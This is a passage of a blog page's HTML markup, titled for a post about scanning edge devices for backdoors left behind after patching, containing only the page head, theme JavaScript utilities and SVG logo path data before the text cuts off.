<!DOCTYPE html><html lang="en">
  <head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>Scanning Beyond the Patch: A Public-Interest Hunt for Hidden Shells - Disclosing.Observer</title>

<meta name="description" content="Even after patching, many edge devices remain compromised. This post explores how to ethically scan for backdoors left behind.">
<link rel="canonical" href="http://localhost:4000/2025/06/14/patching-is-not-enough-persistent-backdoors-after-the-fix.html"><link rel="alternate" type="application/rss+xml" title="Disclosing.Observer" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">

<meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">

<meta name="theme-color" content="#ffffff">
<!-- end favicons snippet --><link rel="stylesheet" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css" ><!-- start custom head snippets -->

<!-- end custom head snippets -->
<script>(function() {
  window.isArray = function(val) {
    return Object.prototype.toString.call(val) === '[object Array]';
  };
  window.isString = function(val) {
    return typeof val === 'string';
  };

  window.hasEvent = function(event) {
    return 'on'.concat(event) in window.document;
  };

  window.isOverallScroller = function(node) {
    return node === document.documentElement || node === document.body || node === window;
  };

  window.isFormElement = function(node) {
    var tagName = node.tagName;
    return tagName === 'INPUT' || tagName === 'SELECT' || tagName === 'TEXTAREA';
  };

  window.pageLoad = (function () {
    var loaded = false, cbs = [];
    window.addEventListener('load', function () {
      var i;
      loaded = true;
      if (cbs.length > 0) {
        for (i = 0; i < cbs.length; i++) {
          cbs[i]();
        }
      }
    });
    return {
      then: function(cb) {
        cb && (loaded ? cb() : (cbs.push(cb)));
      }
    };
  })();
})();
(function() {
  window.throttle = function(func, wait) {
    var args, result, thisArg, timeoutId, lastCalled = 0;

    function trailingCall() {
      lastCalled = new Date;
      timeoutId = null;
      result = func.apply(thisArg, args);
    }
    return function() {
      var now = new Date,
        remaining = wait - (now - lastCalled);

      args = arguments;
      thisArg = this;

      if (remaining <= 0) {
        clearTimeout(timeoutId);
        timeoutId = null;
        lastCalled = now;
        result = func.apply(thisArg, args);
      } else if (!timeoutId) {
        timeoutId = setTimeout(trailingCall, remaining);
      }
      return result;
    };
  };
})();
(function() {
  var Set = (function() {
    var add = function(item) {
      var i, data = this._data;
      for (i = 0; i < data.length; i++) {
        if (data[i] === item) {
          return;
        }
      }
      this.size ++;
      data.push(item);
      return data;
    };

    var Set = function(data) {
      this.size = 0;
      this._data = [];
      var i;
      if (data.length > 0) {
        for (i = 0; i < data.length; i++) {
          add.call(this, data[i]);
        }
      }
    };
    Set.prototype.add = add;
    Set.prototype.get = function(index) { return this._data[index]; };
    Set.prototype.has = function(item) {
      var i, data = this._data;
      for (i = 0; i < data.length; i++) {
        if (this.get(i) === item) {
          return true;
        }
      }
      return false;
    };
    Set.prototype.is = function(map) {
      if (map._data.length !== this._data.length) { return false; }
      var i, j, flag, tData = this._data, mData = map._data;
      for (i = 0; i < tData.length; i++) {
        for (flag = false, j = 0; j < mData.length; j++) {
          if (tData[i] === mData[j]) {
            flag = true;
            break;
          }
        }
        if (!flag) { return false; }
      }
      return true;
    };
    Set.prototype.values = function() {
      return this._data;
    };
    return Set;
  })();

  window.Lazyload = (function(doc) {
    var queue = {js: [], css: []}, sources = {js: {}, css: {}}, context = this;
    var createNode = function(name, attrs) {
      var node = doc.createElement(name), attr;
      for (attr in attrs) {
        if (attrs.hasOwnProperty(attr)) {
          node.setAttribute(attr, attrs[attr]);
        }
      }
      return node;
    };
    var end = function(type, url) {
      var s, q, qi, cbs, i, j, cur, val, flag;
      if (type === 'js' || type ==='css') {
        s = sources[type], q = queue[type];
        s[url] = true;
        for (i = 0; i < q.length; i++) {
          cur = q[i];
          if (cur.urls.has(url)) {
            qi = cur, val = qi.urls.values();
            qi && (cbs = qi.callbacks);
            for (flag = true, j = 0; j < val.length; j++) {
              cur = val[j];
              if (!s[cur]) {
                flag = false;
              }
            }
            if (flag && cbs && cbs.length > 0) {
              for (j = 0; j < cbs.length; j++) {
                cbs[j].call(context);
              }
              qi.load = true;
            }
          }
        }
      }
    };
    var load = function(type, urls, callback) {
      var s, q, qi, node, i, cur,
        _urls = typeof urls === 'string' ? new Set([urls]) : new Set(urls), val, url;
      if (type === 'js' || type ==='css') {
        s = sources[type], q = queue[type];
        for (i = 0; i < q.length; i++) {
          cur = q[i];
          if (_urls.is(cur.urls)) {
            qi = cur;
            break;
          }
        }
        val = _urls.values();
        if (qi) {
          callback && (qi.load || qi.callbacks.push(callback));
          callback && (qi.load && callback());
        } else {
          q.push({
            urls: _urls,
            callbacks: callback ? [callback] : [],
            load: false
          });
          for (i = 0; i < val.length; i++) {
            node = null, url = val[i];
            if (s[url] === undefined) {
              (type === 'js' ) && (node = createNode('script', { src: url }));
              (type === 'css') && (node = createNode('link', { rel: 'stylesheet', href: url }));
              if (node) {
                node.onload = (function(type, url) {
                  return function() {
                    end(type, url);
                  };
                })(type, url);
                (doc.head || doc.body).appendChild(node);
                s[url] = false;
              }
            }
          }
        }
      }
    };
    return {
      js: function(url, callback) {
        load('js', url, callback);
      },
      css: function(url, callback) {
        load('css', url, callback);
      }
    };
  })(this.document);
})();
</script><script>
  (function() {
    var TEXT_VARIABLES = {
      version: '2.2.6',
      sources: {
        font_awesome: 'https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css',
        jquery: 'https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js',
        leancloud_js_sdk: '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js',
        chart: 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js',
        gitalk: {
          js: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.js',
          css: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.css'
        },
        valine: 'https://unpkg.com/valine/dist/Valine.min.js',
        mathjax: 'https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML',
        mermaid: 'https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js'
      },
      site: {
        toc: {
          selectors: 'h1,h2,h3'
        }
      },
      paths: {
        search_js: '/assets/search.js'
      }
    };
    window.TEXT_VARIABLES = TEXT_VARIABLES;
  })();
</script>
</head>
  <body>
    <div class="root" data-is-touch="false">
      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">

      <div class="page__main-inner"><div class="page__header d-print-none"><header class="header header--dark"><div class="main">
      <div class="header__title">
        <div class="header__brand">
          <div class="logo-wrapper"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="1920" zoomAndPan="magnify" viewBox="0 0 1440 299.999988" height="400" preserveAspectRatio="xMidYMid meet" version="1.0"><defs><g/><clipPath id="2179c428b5"><path d="M 762.960938 78.03125 L 893 78.03125 L 893 209.28125 L 762.960938 209.28125 Z M 762.960938 78.03125 " clip-rule="nonzero"/></clipPath><clipPath id="6ca335b253"><path d="M 762.960938 78.03125 L 893.460938 78.03125 L 893.460938 209.28125 L 762.960938 209.28125 Z M 762.960938 78.03125 " clip-rule="nonzero"/></clipPath></defs><g clip-path="url(#2179c428b5)"><path fill="#fcfcfc" d="M 833.011719 140.859375 L 833.011719 78.03125 C 871.160156 80.519531 893.441406 110.007812 892.820312 140.859375 Z M 782.65625 147.527344 L 762.964844 147.527344 C 762.964844 181.753906 790.710938 209.5 824.9375 209.5 L 824.9375 189.808594 C 801.585938 189.808594 782.65625 170.878906 782.65625 147.527344 Z M 801.441406 147.527344 L 790.496094 147.527344 C 790.496094 166.546875 805.917969 181.96875 824.9375 181.96875 L 824.9375 171.023438 C 811.960938 171.023438 801.441406 160.503906 801.441406 147.527344 Z M 801.441406 147.527344 " fill-opacity="1" fill-rule="evenodd"/></g><g clip-path="url(#6ca335b253)"><path fill="#ffb000" d="M 801.441406 140.476562 L 790.496094 140.476562 C 790.496094 121.453125 805.917969 106.035156 824.9375 106.035156 L 824.9375 116.976562 C 811.960938 116.976562 801.441406 127.5 801.441406 140.476562 Z M 831.359375 189.808594 L 831.359375 209.5 C 865.585938 209.5 893.332031 181.753906 893.332031 147.527344 L 873.640625 147.527344 C 873.640625 170.878906 854.710938 189.808594 831.359375 189.808594 Z M 831.359375 171.023438 L 831.359375 181.96875 C 850.382812 181.96875 865.800781 166.546875 865.800781 147.527344 L 854.855469 147.527344 C 854.855469 160.503906 844.335938 171.023438 831.359375 171.023438 Z M 782.65625 140.476562 L 762.964844 140.476562 C 762.964844 106.246094 790.710938 78.5 824.9375 78.5 L 824.9375 98.195312 C 801.585938 98.195312 782.65625 117.125 782.65625 140.476562 Z M 782.65625 140.476562 " fill-opacity="1" fill-rule="evenodd"/></g><g fill="#fcfcfc" fill-opacity="1"><g transform="translate(15.000028, 207.849388)"><g><path d="M 10.1875 0 L 10.1875 -100.359375 C 23.957031 -101.234375 36.945312 -101.671875 49.15625 -101.671875 C 65.15625 -101.671875 76.28125 -97.984375 82.53125 -90.609375 C 88.789062 -83.242188 91.921875 -69.765625 91.921875 -50.171875 C 91.921875 -30.585938 88.789062 -17.109375 82.53125 -9.734375 C 76.28125 -2.367188 65.15625 1.3125 49.15625 1.3125 C 36.945312 1.3125 23.957031 0.875 10.1875 0 Z M 32.296875 -84.21875 L 32.296875 -16.296875 C 33.941406 -16.296875 36.628906 -16.269531 40.359375 -16.21875 C 44.097656 -16.164062 47.03125 -16.140625 49.15625 -16.140625 C 56.625 -16.140625 61.738281 -18.515625 64.5 -23.265625 C 67.269531 -28.023438 68.65625 -37 68.65625 -50.1875 C 68.65625 -63.375 67.269531 -72.363281 64.5 -77.15625 C 61.738281 -81.957031 56.625 -84.359375 49.15625 -84.359375 Z M 32.296875 -84.21875 "/></g></g></g><g fill="#fcfcfc" fill-opacity="1"><g transform="translate(113.906046, 207.849388)"><g><path d="M 15.265625 -103.421875 L 24.875 -103.421875 C 29.039062 -103.421875 31.125 -101.332031 31.125 -97.15625 L 31.125 -89.3125 C 31.125 -85.132812 29.039062 -83.046875 24.875 -83.046875 L 15.265625 -83.046875 C 11.097656 -83.046875 9.015625 -85.132812 9.015625 -89.3125 L 9.015625 -97.15625 C 9.015625 -101.332031 11.097656 -103.421875 15.265625 -103.421875 Z M 30.84375 0 L 9.453125 0 L 9.453125 -71.703125 L 30.84375 -71.703125 Z M 30.84375 0 "/></g></g></g><g fill="#fcfcfc" fill-opacity="1"><g transform="translate(154.050241, 207.849388)"><g><path d="M 40.734375 -26.625 L 22.84375 -31.421875 C 16.25 -33.359375 11.6875 -36 9.15625 -39.34375 C 6.632812 -42.6875 5.375 -47.316406 5.375 -53.234375 C 5.375 -60.703125 7.675781 -65.988281 12.28125 -69.09375 C 16.894531 -72.195312 24.773438 -73.75 35.921875 -73.75 C 48.816406 -73.550781 59.875 -72.628906 69.09375 -70.984375 L 67.640625 -57.15625 C 55.421875 -57.351562 46.207031 -57.453125 40 -57.453125 C 36.601562 -57.453125 34.25 -57.425781 32.9375 -57.375 C 31.632812 -57.332031 30.328125 -57.164062 29.015625 -56.875 C 27.703125 -56.582031 26.898438 -56.117188 26.609375 -55.484375 C 26.328125 -54.859375 26.1875 -53.914062 26.1875 -52.65625 C 26.1875 -52.164062 26.207031 -51.726562 26.25 -51.34375 C 26.300781 -50.957031 26.421875 -50.59375 26.609375 -50.25 C 26.804688 -49.914062 26.976562 -49.648438 27.125 -49.453125 C 27.269531 -49.253906 27.535156 -49.035156 27.921875 -48.796875 C 28.316406 -48.554688 28.632812 -48.382812 28.875 -48.28125 C 29.113281 -48.1875 29.546875 -48.019531 30.171875 -47.78125 C 30.804688 -47.539062 31.289062 -47.367188 31.625 -47.265625 C 31.96875 -47.171875 32.597656 -47.003906 33.515625 -46.765625 C 34.441406 -46.523438 35.148438 -46.351562 35.640625 -46.25 L 53.96875 -41.3125 C 60.363281 -39.46875 64.914062 -37.015625 67.625 -33.953125 C 70.34375 -30.898438 71.703125 -26.367188 71.703125 -20.359375 C 71.703125 -11.828125 69.226562 -6.035156 64.28125 -2.984375 C 59.34375 0.0664062 50.863281 1.59375 38.84375 1.59375 C 27.195312 1.59375 16.476562 0.769531 6.6875 -0.875 L 8 -14.84375 C 11.488281 -14.644531 19.78125 -14.546875 32.875 -14.546875 C 40.34375 -14.546875 45.210938 -14.859375 47.484375 -15.484375 C 49.765625 -16.117188 50.90625 -17.597656 50.90625 -19.921875 C 50.90625 -20.410156 50.878906 -20.847656 50.828125 -21.234375 C 50.785156 -21.617188 50.664062 -21.984375 50.46875 -22.328125 C 50.28125 -22.671875 50.085938 -22.9375 49.890625 -23.125 C 49.691406 -23.320312 49.375 -23.539062 48.9375 -23.78125 C 48.507812 -24.019531 48.171875 -24.210938 47.921875 -24.359375 C 47.679688 -24.503906 47.222656 -24.695312 46.546875 -24.9375 C 45.867188 -25.1875 45.332031 -25.359375 44.9375 -25.453125 C 44.550781 -25.546875 43.875 -25.710938 42.90625 -25.953125 C 41.9375 -26.203125 41.210938 -26.425781 40.734375 -26.625 Z M 40.734375 -26.625 "/></g></g></g><g fill="#fcfcfc" fill-opacity="1"><g transform="translate(230.702414, 207.849388)"><g><path d="M 67.640625 -17.015625 L 69.53125 -3.046875 C 62.15625 0.148438 52.894531 1.75 41.75 1.75 C 28.5625 1.75 19.273438 -1.082031 13.890625 -6.75 C 8.503906 -12.425781 5.8125 -22.148438 5.8125 -35.921875 C 5.8125 -49.796875 8.523438 -59.566406 13.953125 -65.234375 C 19.390625 -70.910156 28.75 -73.75 42.03125 -73.75 C 52.894531 -73.75 61.722656 -72.242188 68.515625 -69.234375 L 66.1875 -55.859375 C 55.707031 -56.046875 48.867188 -56.140625 45.671875 -56.140625 C 39.078125 -56.140625 34.539062 -54.734375 32.0625 -51.921875 C 29.59375 -49.109375 28.359375 -43.773438 28.359375 -35.921875 C 28.359375 -28.066406 29.59375 -22.734375 32.0625 -19.921875 C 34.539062 -17.109375 39.078125 -15.703125 45.671875 -15.703125 C 54.109375 -15.703125 61.429688 -16.140625 67.640625 -17.015625 Z M 67.640625 -17.015625 "/></g></g></g><g fill="#fcfcfc" fill-opacity="1"><g transform="translate(304.445572, 207.849388)"><g><path d="M 30.40625 -101.8125 L 30.40625 -23.421875 C 30.40625 -18.566406 33.117188 -16.140625 38.546875 -16.140625 L 44.359375 -16.140625 L 46.828125 -1.15625 C 43.148438 0.78125 37.429688 1.75 29.671875 1.75 C 23.273438 1.75 18.234375 0.03125 14.546875 -3.40625 C 10.859375 -6.851562 9.015625 -11.726562 9.015625 -18.03125 L 9.015625 -101.8125 Z M 30.40625 -101.8125 "/></g></g></g><g fill="#fcfcfc" fill-opacity="1"><g transform="translate(352.007724, 207.849388)"><g><path d="M 42.765625 -73.75 C 56.140625 -73.75 65.613281 -70.863281 71.1875 -65.09375 C 76.769531 -59.320312 79.5625 -49.550781 79.5625 -35.78125 C 79.5625 -22.007812 76.769531 -12.285156 71.1875 -6.609375 C 65.613281 -0.941406 56.140625 1.890625 42.765625 1.890625 C 29.285156 1.890625 19.753906 -0.941406 14.171875 -6.609375 C 8.597656 -12.285156 5.8125 -22.007812 5.8125 -35.78125 C 5.8125 -49.644531 8.597656 -59.4375 14.171875 -65.15625 C 19.753906 -70.882812 29.285156 -73.75 42.765625 -73.75 Z M 42.765625 -57.59375 C 37.046875 -57.59375 33.210938 -56.140625 31.265625 -53.234375 C 29.328125 -50.328125 28.359375 -44.507812 28.359375 -35.78125 C 28.359375 -27.25 29.328125 -21.523438 31.265625 -18.609375 C 33.210938 -15.703125 37.046875 -14.25 42.765625 -14.25 C 48.285156 -14.25 52.039062 -15.703125 54.03125 -18.609375 C 56.019531 -21.523438 57.015625 -27.25 57.015625 -35.78125 C 57.015625 -44.414062 56.046875 -50.207031 54.109375 -53.15625 C 52.171875 -56.113281 48.390625 -57.59375 42.765625 -57.59375 Z M 42.765625 -57.59375 "/></g></g></g><g fill="#fcfcfc" fill-opacity="1"><g transform="translate(437.386889, 207.849388)"><g><path d="M 40.734375 -26.625 L 22.84375 -31.421875 C 16.25 -33.359375 11.6875 -36 9.15625 -39.34375 C 6.632812 -42.6875 5.375 -47.316406 5.375 -53.234375 C 5.375 -60.703125 7.675781 -65.988281 12.28125 -69.09375 C 16.894531 -72.195312 24.773438 -73.75 35.921875 -73.75 C 48.816406 -73.550781 59.875 -72.628906 69.09375 -70.984375 L 67.640625 -57.15625 C 55.421875 -57.351562 46.207031 -57.453125 40 -57.453125 C 36.601562 -57.453125 34.25 -57.425781 32.9375 -57.375 C 31.632812 -57.332031 30.328125 -57.164062 29.015625 -56.875 C 27.703125 -56.582031 26.898438 -56.117188 26.609375 -55.484375 C 26.328125 -54.859375 26.1875 -53.914062 26.1875 -52.65625 C 26.1875 -52.164062 26.207031 -51.726562 26.25 -51.34375 C 26.300781 -50.957031 26.421875 -50.59375 26.609375 -50.25 C 26.804688 -49.914062 26.976562 -49.648438 27.125 -49.453125 C 27.269531 -49.253906 27.535156 -49.035156 27.921875 -48.796875 C 28.316406 -48.554688 28.632812 -48.382812 28.875 -48.28125 C 29.113281 -48.1875 29.546875 -48.019531 30.171875 -47.78125 C 30.804688 -47.539062 31.289062 -47.367188 31.625 -47.265625 C 31.96875 -47.171875 32.597656 -47.003906 33.515625 -46.765625 C 34.441406 -46.523438 35.148438 -46.351562 35.640625 -46.25 L 53.96875 -41.3125 C 60.363281 -39.46875 64.914062 -37.015625 67.625 -33.953125 C 70.34375 -30.898438 71.703125 -26.367188 71.703125 -20.359375 C 71.703125 -11.828125 69.226562 -6.035156 64.28125 -2.984375 C 59.34375 0.0664062 50.863281 1.59375 38.84375 1.59375 C 27.195312 1.59375 16.476562 0.769531 6.6875 -0.875 L 8 -14.84375 C 11.488281 -14.644531 19.78125 -14.546875 32.875 -14.546875 C 40.34375 -14.546875 45.210938 -14.859375 47.484375 -15.484375 C 49.765625 -16.117188 50.90625 -17.597656 50.90625 -19.921875 C 50.90625 -20.410156 50.878906 -20.847656 50.828125 -21.234375 C 50.785156 -21.617188 50.664062 -21.984375 50.46875 -22.328125 C 50.28125 -22.671875 50.085938 -22.9375 49.890625 -23.125 C 49.691406 -23.320312 49.375 -23.539062 48.9375 -23.78125 C 48.507812 -24.019531 48.171875 -24.210938 47.921875 -24.359375 C 47.679688 -24.503906 47.222656 -24.695312 46.546875 -24.9375 C 45.867188 -25.1875 45.332031 -25.359375 44.9375 -25.453125 C 44.550781 -25.546875 43.875 -25.710938 42.90625 -25.953125 C 41.9375 -26.203125 41.210938 -26.425781 40.734375 -26.625 Z M 40.734375 -26.625 "/></g></g></g><g fill="#fcfcfc" fill-opacity="1"><g transform="translate(514.039086, 207.849388)"><g><path d="M 15.265625 -103.421875 L 24.875 -103.421875 C 29.039062 -103.421875 31.125 -101.332031 31.125 -97.15625 L 31.125 -89.3125 C 31.125 -85.132812 29.039062 -83.046875 24.875 -83.046875 L 15.265625 -83.046875 C 11.097656 -83.046875 9.015625 -85.132812 9.015625 -89.3125 L 9.015625 -97.15625 C 9.015625 -101.332031 11.097656 -103.421875 15.265625 -103.421875 Z M 30.84375 0 L 9.453125 0 L 9.453125 -71.703125 L 30.84375 -71.703125 Z M 30.84375 0 "/></g></g></g><g fill="#fcfcfc" fill-opacity="1"><g transform="translate(554.183307, 207.849388)"><g><path d="M 26.328125 -71.703125 L 27.921875 -61.09375 C 38.296875 -69.53125 48.53125 -73.75 58.625 -73.75 C 65.113281 -73.75 70.078125 -72.050781 73.515625 -68.65625 C 76.960938 -65.257812 78.6875 -60.3125 78.6875 -53.8125 L 78.6875 0 L 57.3125 0 L 57.3125 -47.125 C 57.3125 -50.320312 56.800781 -52.523438 55.78125 -53.734375 C 54.757812 -54.953125 52.941406 -55.5625 50.328125 -55.5625 C 45.765625 -55.5625 39.125 -53.378906 30.40625 -49.015625 L 30.40625 0 L 8.875 0 L 8.875 -71.703125 Z M 26.328125 -71.703125 "/></g></g></g><g fill="#fcfcfc" fill-opacity="1"><g transform="translate(641.307871, 207.849388)"><g><path d="M 81.3125 -62.25 L 72.296875 -61.09375 C 73.453125 -58.375 74.03125 -54.929688 74.03125 -50.765625 C 74.03125 -42.421875 71.53125 -36.503906 66.53125 -33.015625 C 61.539062 -29.523438 52.796875 -27.78125 40.296875 -27.78125 C 36.117188 -27.78125 31.992188 -28.023438 27.921875 -28.515625 C 26.765625 -26.960938 26.546875 -25.210938 27.265625 -23.265625 C 27.992188 -21.328125 29.617188 -20.210938 32.140625 -19.921875 L 58.1875 -16.875 C 65.550781 -16 70.859375 -13.863281 74.109375 -10.46875 C 77.359375 -7.070312 78.984375 -2.078125 78.984375 4.515625 C 78.984375 13.628906 76.242188 19.785156 70.765625 22.984375 C 65.285156 26.179688 55.46875 27.78125 41.3125 27.78125 C 26.570312 27.78125 16.582031 26.253906 11.34375 23.203125 C 6.101562 20.148438 3.484375 14.550781 3.484375 6.40625 C 3.484375 2.71875 4.332031 -0.3125 6.03125 -2.6875 C 7.726562 -5.0625 10.664062 -7.21875 14.84375 -9.15625 C 11.539062 -12.363281 10.203125 -16.316406 10.828125 -21.015625 C 11.460938 -25.722656 13.570312 -29.140625 17.15625 -31.265625 C 10.082031 -34.566406 6.546875 -41.019531 6.546875 -50.625 C 6.546875 -59.050781 9.066406 -65.007812 14.109375 -68.5 C 19.148438 -72 27.925781 -73.75 40.4375 -73.75 C 48 -73.75 54.253906 -73.066406 59.203125 -71.703125 L 82.328125 -71.703125 Z M 40.296875 -41.453125 C 45.523438 -41.453125 49.132812 -42.128906 51.125 -43.484375 C 53.113281 -44.847656 54.109375 -47.273438 54.109375 -50.765625 C 54.109375 -54.347656 53.140625 -56.769531 51.203125 -58.03125 C 49.265625 -59.289062 45.628906 -59.921875 40.296875 -59.921875 C 34.960938 -59.921875 31.300781 -59.289062 29.3125 -58.03125 C 27.320312 -56.769531 26.328125 -54.347656 26.328125 -50.765625 C 26.328125 -47.273438 27.320312 -44.847656 29.3125 -43.484375 C 31.300781 -42.128906 34.960938 -41.453125 40.296875 -41.453125 Z M 46.6875 -2.765625 L 28.65625 -4.65625 C 25.550781 -2.132812 24 0.628906 24 3.640625 C 24 7.128906 25.066406 9.359375 27.203125 10.328125 C 29.335938 11.296875 33.941406 11.78125 41.015625 11.78125 C 48.097656 11.78125 52.773438 11.269531 55.046875 10.25 C 57.328125 9.238281 58.46875 7.128906 58.46875 3.921875 C 58.46875 1.398438 57.738281 -0.195312 56.28125 -0.875 C 54.832031 -1.550781 51.632812 -2.179688 46.6875 -2.765625 Z M 46.6875 -2.765625 "/></g></g></g><g fill="#fcfcfc" fill-opacity="1"><g transform="translate(725.52342, 207.849388)"><g><path d="M 14.984375 -21.96875 L 20.796875 -21.96875 C 23.609375 -21.96875 25.570312 -21.429688 26.6875 -20.359375 C 27.800781 -19.296875 28.359375 -17.359375 28.359375 -14.546875 L 28.359375 -7.5625 C 28.359375 -4.75 27.800781 -2.785156 26.6875 -1.671875 C 25.570312 -0.554688 23.609375 0 20.796875 0 L 14.984375 0 C 12.171875 0 10.207031 -0.554688 9.09375 -1.671875 C 7.976562 -2.785156 7.421875 -4.75 7.421875 -7.5625 L 7.421875 -14.546875 C 7.421875 -17.359375 7.976562 -19.296875 9.09375 -20.359375 C 10.207031 -21.429688 12.171875 -21.96875 14.984375 -21.96875 Z M 14.984375 -21.96875 "/></g></g></g><g fill="#fcfcfc" fill-opacity="1"><g transform="translate(895.109668, 207.849388)"><g><path d="M 30.25 -101.8125 L 30.25 -78.984375 C 30.25 -72.285156 29.617188 -66.660156 28.359375 -62.109375 C 35.921875 -69.867188 44.40625 -73.75 53.8125 -73.75 C 63.125 -73.75 69.835938 -70.863281 73.953125 -65.09375 C 78.078125 -59.320312 80.140625 -49.796875 80.140625 -36.515625 C 80.140625 -24.191406 77.617188 -14.734375 72.578125 -8.140625 C 67.535156 -1.546875 58.375 1.75 45.09375 1.75 C 39.269531 1.75 32.742188 1.265625 25.515625 0.296875 C 18.296875 -0.671875 12.648438 -2.03125 8.578125 -3.78125 L 8.578125 -101.8125 Z M 30.109375 -50.46875 L 30.109375 -15.5625 C 35.054688 -14.5 39.90625 -14.0625 44.65625 -14.25 C 49.601562 -14.445312 53.066406 -16.097656 55.046875 -19.203125 C 57.035156 -22.304688 58.03125 -28.023438 58.03125 -36.359375 C 58.03125 -44.316406 57.207031 -49.675781 55.5625 -52.4375 C 53.914062 -55.195312 50.472656 -56.578125 45.234375 -56.578125 C 41.253906 -56.578125 36.210938 -54.539062 30.109375 -50.46875 Z M 30.109375 -50.46875 "/></g></g></g><g fill="#fcfcfc" fill-opacity="1"><g transform="translate(981.216087, 207.849388)"><g><path d="M 40.734375 -26.625 L 22.84375 -31.421875 C 16.25 -33.359375 11.6875 -36 9.15625 -39.34375 C 6.632812 -42.6875 5.375 -47.316406 5.375 -53.234375 C 5.375 -60.703125 7.675781 -65.988281 12.28125 -69.09375 C 16.894531 -72.195312 24.773438 -73.75 35.921875 -73.75 C 48.816406 -73.550781 59.875 -72.628906 69.09375 -70.984375 L 67.640625 -57.15625 C 55.421875 -57.351562 46.207031 -57.453125 40 -57.453125 C 36.601562 -57.453125 34.25 -57.425781 32.9375 -57.375 C 31.632812 -57.332031 30.328125 -57.164062 29.015625 -56.875 C 27.703125 -56.582031 26.898438 -56.117188 26.609375 -55.484375 C 26.328125 -54.859375 26.1875 -53.914062 26.1875 -52.65625 C 26.1875 -52.164062 26.207031 -51.726562 26.25 -51.34375 C 26.300781 -50.957031 26.421875 -50.59375 26.609375 -50.25 C 26.804688 -49.914062 26.976562 -49.648438 27.125 -49.453125 C 27.269531 -49.253906 27.535156 -49.035156 27.921875 -48.796875 C 28.316406 -48.554688 28.632812 -48.382812 28.875 -48.28125 C 29.113281 -48.1875 29.546875 -48.019531 30.171875 -47.78125 C 30.804688 -47.539062 31.289062 -47.367188 31.625 -47.265625 C 31.96875 -47.171875 32.597656 -47.003906 33.515625 -46.765625 C 34.441406 -46.523438 35.148438 -46.351562 35.640625 -46.25 L 53.96875 -41.3125 C 60.363281 -39.46875 64.914062 -37.015625 67.625 -33.953125 C 70.34375 -30.898438 71.703125 -26.367188 71.703125 -20.359375 C 71.703125 -11.828125 69.226562 -6.035156 64.28125 -2.984375 C 59.34375 0.0664062 50.863281 1.59375 38.84375 1.59375 C 27.195312 1.59375 16.476562 0.769531 6.6875 -0.875 L 8 -14.84375 C 11.488281 -14.644531 19.78125 -14.546875 32.875 -14.546875 C 40.34375 -14.546875 45.210938 -14.859375 47.484375 -15.484375 C 49.765625 -16.117188 50.90625 -17.597656 50.90625 -19.921875 C 50.90625 -20.410156 50.878906 -20.847656 50.828125 -21.234375 C 50.785156 -21.617188 50.664062 -21.984375 50.46875 -22.328125 C 50.28125 -22.671875 50.085938 -22.9375 49.890625 -23.125 C 49.691406 -23.320312 49.375 -23.539062 48.9375 -23.78125 C 48.507812 -24.019531 48.171875 -24.210938 47.921875 -24.359375 C 47.679688 -24.503906 47.222656 -24.695312 46.546875 -24.9375 C 45.867188 -25.1875 45.332031 -25.359375 44.9375 -25.453125 C 44.550781 -25.546875 43.875 -25.710938 42.90625 -25.953125 C 41.9375 -26.203125 41.210938 -26.425781 40.734375 -26.625 Z M 40.734375 -26.625 "/></g></g></g><g fill="#fcfcfc" fill-opacity="1"><g transform="translate(1057.86826, 207.849388)"><g><path d="M 54.546875 -28.65625 L 28.65625 -28.65625 C 29.332031 -23.414062 30.90625 -19.898438 33.375 -18.109375 C 35.851562 -16.316406 39.953125 -15.421875 45.671875 -15.421875 C 53.328125 -15.421875 62.25 -15.953125 72.4375 -17.015625 L 74.46875 -3.640625 C 67 -0.046875 56.578125 1.75 43.203125 1.75 C 29.722656 1.75 20.117188 -1.15625 14.390625 -6.96875 C 8.671875 -12.789062 5.8125 -22.394531 5.8125 -35.78125 C 5.8125 -49.84375 8.597656 -59.6875 14.171875 -65.3125 C 19.753906 -70.9375 29.140625 -73.75 42.328125 -73.75 C 54.253906 -73.75 62.882812 -71.6875 68.21875 -67.5625 C 73.550781 -63.4375 76.265625 -57.160156 76.359375 -48.734375 C 76.359375 -42.035156 74.632812 -37.015625 71.1875 -33.671875 C 67.75 -30.328125 62.203125 -28.65625 54.546875 -28.65625 Z M 28.21875 -41.59375 L 48.578125 -41.59375 C 51.203125 -41.59375 52.972656 -42.222656 53.890625 -43.484375 C 54.804688 -44.742188 55.265625 -46.585938 55.265625 -49.015625 C 55.265625 -52.410156 54.390625 -54.757812 52.640625 -56.0625 C 50.898438 -57.375 47.703125 -58.03125 43.046875 -58.03125 C 37.523438 -58.03125 33.742188 -56.9375 31.703125 -54.75 C 29.671875 -52.570312 28.507812 -48.1875 28.21875 -41.59375 Z M 28.21875 -41.59375 "/></g></g></g><g fill="#fcfcfc" fill-opacity="1"><g transform="translate(1139.320266, 207.849388)"><g><path d="M 60.359375 -73.75 L 58.1875 -53.8125 L 52.359375 -53.8125 C 47.609375 -53.8125 40.289062 -52.164062 30.40625 -48.875 L 30.40625 0 L 8.875 0 L 8.875 -71.703125 L 25.59375 -71.703125 L 27.484375 -61.234375 C 37.285156 -69.578125 46.984375 -73.75 56.578125 -73.75 Z M 60.359375 